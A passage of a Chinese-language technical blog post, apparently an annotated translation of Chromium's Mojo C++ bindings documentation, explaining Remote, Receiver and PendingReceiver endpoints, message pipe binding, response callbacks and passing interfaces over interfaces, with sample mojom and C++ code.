class="number">2</span>, <span class="number">2</span>, base::BindOnce(...));</span><br></pre></td></tr></table></figure>

<h5 id="mojo-Receiver-BindNewPipeAndPassRemote"><a href="#mojo-Receiver-BindNewPipeAndPassRemote" class="headerlink" title="mojo::Receiver::BindNewPipeAndPassRemote"></a>mojo::Receiver::BindNewPipeAndPassRemote</h5><p>在receiver/callee创建端点时使用。保留一个端点以接收IPC，另一个端点作为未绑定的<code>mojo::PendingRemote&lt;T&gt;</code>返回，以使sender/caller方绑定到<code>mojo::Remote&lt;T&gt;</code>。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MathImpl</span> :</span> <span class="keyword">public</span> math::mojom::MathImpl &#123;</span><br><span class="line">  <span class="comment">// ...addition to the previous MathImpl definition...</span></span><br><span class="line"></span><br><span class="line">  <span class="function">mojo::PendingRemote&lt;math::mojom::Math&gt; <span class="title">GetRemoteMath</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// BindNewPipeAndPassRemote() returns a</span></span><br><span class="line">    <span class="comment">// `mojo::PendingRemote&lt;math::mojom::Math&gt;`. This may be bound to a</span></span><br><span class="line">    <span class="comment">// `mojo::Remote&lt;math::mojom::Math&gt; which can be used to send IPCs that will</span></span><br><span class="line">    <span class="comment">// be handled by |this|.</span></span><br><span class="line">    <span class="keyword">return</span> receiver_.BindNewPipeAndPassRemote();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="mojo-PendingRemote-InitWithNewPipeAndPassReceiver"><a href="#mojo-PendingRemote-InitWithNewPipeAndPassReceiver" class="headerlink" title="mojo::PendingRemote::InitWithNewPipeAndPassReceiver"></a>mojo::PendingRemote::InitWithNewPipeAndPassReceiver</h5><p>不太常见，类似于<code>mojo::Remote&lt;T&gt;::BindNewPipeAndPassReceiver()</code></p>
<h5 id="mojo-Remote-mojo-Receiver-and-mojo-PendingRemote-mojo-PendingReceiver"><a href="#mojo-Remote-mojo-Receiver-and-mojo-PendingRemote-mojo-PendingReceiver" class="headerlink" title="mojo::Remote/mojo::Receiver and mojo::PendingRemote/mojo::PendingReceiver"></a>mojo::Remote/mojo::Receiver and mojo::PendingRemote/mojo::PendingReceiver</h5><p><code>mojo::Remote&lt;T&gt;</code>和<code>mojo::Receiver&lt;T&gt;</code>都有相应的未绑定版本:这允许在同一进程中的sequences之间,甚至在IPC上的进程之间传递端点。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mojo::Remote&lt;math::mojom::MathImpl&gt; remote = ...;</span><br><span class="line"><span class="comment">// |pending_remote| 是可移动的，并且可能会被传递。</span></span><br><span class="line"><span class="comment">// 未绑定时，端点不能用于发送IPC。pending_remote可以传递给mojo::Remote &lt;T&gt;构造函数或mojo::Remote&lt;T&gt;::Bind()来重新绑定端点。</span></span><br><span class="line"><span class="comment">// |pending_remote| is movable and may be passed around. While unbound, the</span></span><br><span class="line"><span class="comment">// endpoint cannot be used to send IPCs. The pending remote may be passed to</span></span><br><span class="line"><span class="comment">// the mojo::Remote&lt;T&gt; constructor or mojo::Remote&lt;T&gt;::Bind() to rebind the</span></span><br><span class="line"><span class="comment">// endpoint.</span></span><br><span class="line">mojo::PendingRemote&lt;math::mojom::MathImpl&gt; pending_remote = remote.Unbind();</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mojo::Receiver&lt;math::mojom::MathImpl&gt; receiver = ...;</span><br><span class="line"><span class="comment">// |pending_receiver| is movable and may be passed around. While unbound,</span></span><br><span class="line"><span class="comment">// received IPCs are buffered and not processed. The pending receiver may be</span></span><br><span class="line"><span class="comment">// passed to the mojo::Receiver&lt;T&gt; constructor or mojo::Receiver&lt;T&gt;::Bind() to</span></span><br><span class="line"><span class="comment">// rebind the endpoint.</span></span><br><span class="line">mojo::PendingReceiver&lt;math::mojom::MathImpl&gt; pending_receiver = receiver.Unbind();</span><br></pre></td></tr></table></figure>
<p>这里的bind和unbind实际上是通过在receiver里保存一个bind state对象来维护的，具体的不叙，可以参考<a href="https://source.chromium.org/chromium/chromium/src/+/master:mojo/public/cpp/bindings/receiver.h" target="_blank" rel="noopener">具体代码</a></p>
<h3 id="Mojo-C-Bindings-API"><a href="#Mojo-C-Bindings-API" class="headerlink" title="Mojo C++ Bindings API"></a>Mojo C++ Bindings API</h3><h4 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;services&#x2F;db&#x2F;public&#x2F;mojom&#x2F;db.mojom</span><br><span class="line">module db.mojom;</span><br><span class="line"></span><br><span class="line">interface Table &#123;</span><br><span class="line">  AddRow(int32 key, string data);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">interface Database &#123;</span><br><span class="line">  CreateTable(Table&amp; table);</span><br><span class="line">&#125;;</span><br><span class="line">...</span><br><span class="line">&#x2F;&#x2F;services&#x2F;db&#x2F;public&#x2F;mojom&#x2F;BUILD.gn</span><br><span class="line">import(&quot;&#x2F;&#x2F;mojo&#x2F;public&#x2F;tools&#x2F;bindings&#x2F;mojom.gni&quot;)</span><br><span class="line"></span><br><span class="line">mojom(&quot;mojom&quot;) &#123;</span><br><span class="line">  sources &#x3D; [</span><br><span class="line">    &quot;db.mojom&quot;,</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">   deps +&#x3D; [ &#39;&#x2F;&#x2F;services&#x2F;db&#x2F;public&#x2F;mojom&#39; ]</span><br><span class="line">...</span><br><span class="line">运行ninja -C out&#x2F;r services&#x2F;db&#x2F;public&#x2F;mojom会生成</span><br><span class="line">-&gt;</span><br><span class="line">out&#x2F;gen&#x2F;services&#x2F;db&#x2F;public&#x2F;mojom&#x2F;db.mojom.cc</span><br><span class="line">out&#x2F;gen&#x2F;services&#x2F;db&#x2F;public&#x2F;mojom&#x2F;db.mojom.h</span><br></pre></td></tr></table></figure>
<p>你能在源码里包含上面生成的头文件，以使用其定义</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"services/business/public/mojom/factory.mojom.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TableImpl</span> :</span> <span class="keyword">public</span> db::mojom::Table &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>本文档涵盖了Mojom IDL为C++使用者生成的各种定义，以及如何有效地使用它们,在消息管道之间进行通信。</p>
<h4 id="Interfaces-1"><a href="#Interfaces-1" class="headerlink" title="Interfaces"></a>Interfaces</h4><h5 id="Basic-Usage"><a href="#Basic-Usage" class="headerlink" title="Basic Usage"></a>Basic Usage</h5><p>让我们看一下<code>//sample/logger.mojom</code>里定义的简单的接口，以及client如何使用他们去log simple string message。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">module sample.mojom;</span><br><span class="line"></span><br><span class="line">interface Logger &#123;</span><br><span class="line">  Log(string message);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>通过binding generator将生成下面的定义</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> sample &#123;</span><br><span class="line"><span class="keyword">namespace</span> mojom &#123;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> &#123;</span></span><br><span class="line">  <span class="keyword">virtual</span> ~Logger() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Log</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; message)</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#125;  <span class="comment">// namespace mojom</span></span><br><span class="line">&#125;  <span class="comment">// namespace sample</span></span><br></pre></td></tr></table></figure>

<h5 id="Remote-and-PendingReceiver"><a href="#Remote-and-PendingReceiver" class="headerlink" title="Remote and PendingReceiver"></a>Remote and PendingReceiver</h5><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-06-074647.jpg" alt=""></p>
<h5 id="Creating-Interface-Pipes"><a href="#Creating-Interface-Pipes" class="headerlink" title="Creating Interface Pipes"></a>Creating Interface Pipes</h5><p>一种方法是手动创建pipe，并用强类型对象包装两端：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"sample/logger.mojom.h"</span></span></span><br><span class="line"></span><br><span class="line">mojo::MessagePipe pipe;</span><br><span class="line"><span class="function">mojo::Remote&lt;sample::mojom::Logger&gt; <span class="title">logger</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    mojo::PendingRemote&lt;sample::mojom::Logger&gt;(<span class="built_in">std</span>::<span class="built_in">move</span>(pipe.handle0), <span class="number">0</span>))</span></span>;</span><br><span class="line"><span class="function">mojo::PendingReceiver&lt;sample::mojom::Logger&gt; <span class="title">receiver</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">move</span>(pipe.handle1))</span></span>;</span><br></pre></td></tr></table></figure>
<p>这很冗长，所以c++ binding库提供了更简便的方法来完成这件事。<a href="https://cs.chromium.org/chromium/src/mojo/public/cpp/bindings/remote.h" target="_blank" rel="noopener">remote.h</a>定义了BindNewPipeAndPassReceiver</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mojo::Remote&lt;sample::mojom::Logger&gt; logger;</span><br><span class="line"><span class="keyword">auto</span> receiver = logger.BindNewPipeAndPassReceiver());</span><br></pre></td></tr></table></figure>
<p>这个代码和之前的等价。</p>
<p>绑定<code>PendingRemote&lt;Logger&gt;</code>后，我们可以立即开始在其上调用Logger接口方法，该方法将立即将消息写入管道。这些消息将在管道的receiver排队，直到有人绑定到receiver并开始读取它们为止。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger-&gt;Log(&quot;Hello!&quot;);</span><br></pre></td></tr></table></figure>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-06-080009.jpg" alt=""><br>但是<code>PendingReceiver&lt;T&gt;</code>本质上只是一个类型化的容器，用于容纳<code>Remote&lt;T&gt;</code>管道的另一端（即接收端），直到将其绑定到接口的具体实现上。 <code>PendingReceiver&lt;T&gt;</code>实际上除了保留管道端点并携带有用的编译时类型信息外，没有做任何其他事情。<br>因此该消息将永远存在于管道中。我们需要一种从管道的另一端读取消息并进行分发的方法。我们必须<strong>bind这个pending receiver</strong></p>
<h5 id="Binding-a-Pending-Receiver"><a href="#Binding-a-Pending-Receiver" class="headerlink" title="Binding a Pending Receiver"></a>Binding a Pending Receiver</h5><p>这有许多不同的helper类，用于binding message pipe的receiver端，其中最原始的是<code>mojo::Receiver&lt;T&gt;</code>，<code>mojo::Receiver&lt;T&gt;</code>将T的impl和单个的message pipe端点<code>mojo::PendingReceiver&lt;T&gt;</code>绑定到一起，并监视是否有新消息发送过来。<br>每当bound pipe有新消息可读，Receiver都会安排一个task去读，反序列化消息并将其分发到其绑定的impl去。<br>下面是Logger接口的示例实现，注意，一般implement会own <code>mojo::Receiver</code>字段，这是一种常见的模式。因为<strong>绑定的implement必须比绑定它的任何mojo::Receiver存活的更久</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"base/logging.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"base/macros.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"sample/logger.mojom.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoggerImpl</span> :</span> <span class="keyword">public</span> sample::mojom::Logger &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// <span class="doctag">NOTE:</span> A common pattern for interface implementations which have one</span></span><br><span class="line">  <span class="comment">// instance per client is to take a PendingReceiver in the constructor.</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">LoggerImpl</span><span class="params">(mojo::PendingReceiver&lt;sample::mojom::Logger&gt; receiver)</span></span></span><br><span class="line"><span class="function">      : <span class="title">receiver_</span><span class="params">(<span class="keyword">this</span>, <span class="built_in">std</span>::<span class="built_in">move</span>(receiver))</span> </span>&#123;&#125;</span><br><span class="line">  ~Logger() <span class="keyword">override</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sample::mojom::Logger:</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Log</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; message)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    LOG(ERROR) &lt;&lt; <span class="string">"[Logger] "</span> &lt;&lt; message;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  mojo::Receiver&lt;sample::mojom::Logger&gt; receiver_;</span><br><span class="line"></span><br><span class="line">  DISALLOW_COPY_AND_ASSIGN(LoggerImpl);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>现在我们可以使用<code>PendingReceiver&lt;Logger&gt;</code>来构造出一个LoggerImpl,<code>LoggerImpl impl(std::move(receiver));</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-06-083538.jpg" alt=""></p>
<h5 id="Receiving-Responses"><a href="#Receiving-Responses" class="headerlink" title="Receiving Responses"></a>Receiving Responses</h5><p>一些mojom接口需要response，我们修改Logger接口，从而获取最后一个Log行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">module sample.mojom;</span><br><span class="line"></span><br><span class="line">interface Logger &#123;</span><br><span class="line">  Log(string message);</span><br><span class="line">  GetTail() &#x3D;&gt; (string message);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>现在生成的c++ interface是这样的</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> sample &#123;</span><br><span class="line"><span class="keyword">namespace</span> mojom &#123;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">virtual</span> ~Logger() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Log</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; message)</span> </span>= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">using</span> GetTailCallback = base::OnceCallback&lt;<span class="keyword">void</span>(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; message)&gt;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">GetTail</span><span class="params">(GetTailCallback callback)</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;  <span class="comment">// namespace mojom</span></span><br><span class="line">&#125;  <span class="comment">// namespace sample</span></span><br></pre></td></tr></table></figure>
<p>和之前一样，此接口的client和implement对GetTail都使用相同的函数签名:implement使用callback参数去对请求进行响应，而client传递callback参数来异步接收响应，现在的implement是这样的:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoggerImpl</span> :</span> <span class="keyword">public</span> sample::mojom::Logger &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// <span class="doctag">NOTE:</span> A common pattern for interface implementations which have one</span></span><br><span class="line">  <span class="comment">// instance per client is to take a PendingReceiver in the constructor.</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">LoggerImpl</span><span class="params">(mojo::PendingReceiver&lt;sample::mojom::Logger&gt; receiver)</span></span></span><br><span class="line"><span class="function">      : <span class="title">receiver_</span><span class="params">(<span class="keyword">this</span>, <span class="built_in">std</span>::<span class="built_in">move</span>(receiver))</span> </span>&#123;&#125;</span><br><span class="line">  ~Logger() <span class="keyword">override</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sample::mojom::Logger:</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Log</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; message)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    LOG(ERROR) &lt;&lt; <span class="string">"[Logger] "</span> &lt;&lt; message;</span><br><span class="line">    lines_.push_back(message);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">GetTail</span><span class="params">(GetTailCallback callback)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">move</span>(callback).Run(lines_.back());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  mojo::Receiver&lt;sample::mojom::Logger&gt; receiver_;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; lines_;</span><br><span class="line"></span><br><span class="line">  DISALLOW_COPY_AND_ASSIGN(LoggerImpl);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>现在client可以这样调用GetTail</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OnGetTail</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; message)</span> </span>&#123;</span><br><span class="line">  LOG(ERROR) &lt;&lt; <span class="string">"Tail was: "</span> &lt;&lt; message;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">logger-&gt;GetTail(base::BindOnce(&amp;OnGetTail));</span><br></pre></td></tr></table></figure>


<h4 id="Sending-Interfaces-Over-Interfaces"><a href="#Sending-Interfaces-Over-Interfaces" class="headerlink" title="Sending Interfaces Over Interfaces"></a>Sending Interfaces Over Interfaces</h4><p>我们知道如何创建接口管道,并以一些有趣的方式使用它们的Remote和PendingReceiver端点。这仍然不构成有趣的IPC!Mojo IPC的主要功能是能够跨其他接口传输接口端点，因此让我们看一下如何实现这一点。</p>
<h5 id="Sending-Pending-Receivers"><a href="#Sending-Pending-Receivers" class="headerlink" title="Sending Pending Receivers"></a>Sending Pending Receivers</h5><p>考虑如下Mojom</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">module db.mojom;</span><br><span class="line"></span><br><span class="line">interface Table &#123;</span><br><span class="line">  void AddRow(int32 key, string data);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">interface Database &#123;</span><br><span class="line">  AddTable(pending_receiver&lt;Table&gt; table);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>pending_receiver&lt;Table&gt;</code>对应c++里的<code>PendingReceiver&lt;T&gt;</code>类型，并且为这个mojom生成类似如下的代码:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> db &#123;</span><br><span class="line"><span class="keyword">namespace</span> mojom &#123;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Table</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">virtual</span> ~Table() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">AddRow</span><span class="params">(<span class="keyword">int32_t</span> key, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; data)</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Database</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">virtual</span> ~Database() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">AddTable</span><span class="params">(mojo::PendingReceiver&lt;Table&gt; table)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#125;  <span class="comment">// namespace mojom</span></span><br><span class="line">&#125;  <span class="comment">// namespace db</span></span><br></pre></td></tr></table></figure>
<p>其对应的implemention如下:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"sample/db.mojom.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TableImpl</span> :</span> <span class="keyword">public</span> db::mojom:Table &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">TableImpl</span><span class="params">(mojo::PendingReceiver&lt;db::mojom::Table&gt; receiver)</span></span></span><br><span class="line"><span class="function">      : <span class="title">receiver_</span><span class="params">(<span class="keyword">this</span>, <span class="built_in">std</span>::<span class="built_in">move</span>(receiver))</span> </span>&#123;&#125;</span><br><span class="line">  ~TableImpl() <span class="keyword">override</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// db::mojom::Table:</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">AddRow</span><span class="params">(<span class="keyword">int32_t</span> key, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; data)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    rows_.insert(&#123;key, data&#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  mojo::Receiver&lt;db::mojom::Table&gt; receiver_;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="keyword">int32_t</span>, <span class="built_in">std</span>::<span class="built_in">string</span>&gt; rows_;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DatabaseImpl</span> :</span> <span class="keyword">public</span> db::mojom::Database &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">DatabaseImpl</span><span class="params">(mojo::PendingReceiver&lt;db::mojom::Database&gt; receiver)</span></span></span><br><span class="line"><span class="function">      : <span class="title">receiver_</span><span class="params">(<span class="keyword">this</span>, <span class="built_in">std</span>::<span class="built_in">move</span>(receiver))</span> </span>&#123;&#125;</span><br><span class="line">  ~DatabaseImpl() <span class="keyword">override</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// db::mojom::Database:</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">AddTable</span><span class="params">(mojo::PendingReceiver&lt;db::mojom::Table&gt; table)</span> </span>&#123;</span><br><span class="line">    tables_.emplace_back(<span class="built_in">std</span>::make_unique&lt;TableImpl&gt;(<span class="built_in">std</span>::<span class="built_in">move</span>(table)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  mojo::Receiver&lt;db::mojom::Database&gt; receiver_;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;TableImpl&gt;&gt; tables_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>pending_receiver&lt;Table&gt;</code>参数对应的是一个强类型的message pipe handle，当DatabaseImpl接收到一个AddTable消息时，它构造一个新的<code>TableImpl</code>实例，并且将其绑定到接收到的<code>mojo::PendingReceiver&lt;db::mojom::Table&gt;</code><br>让我们看一下具体的用法</p>
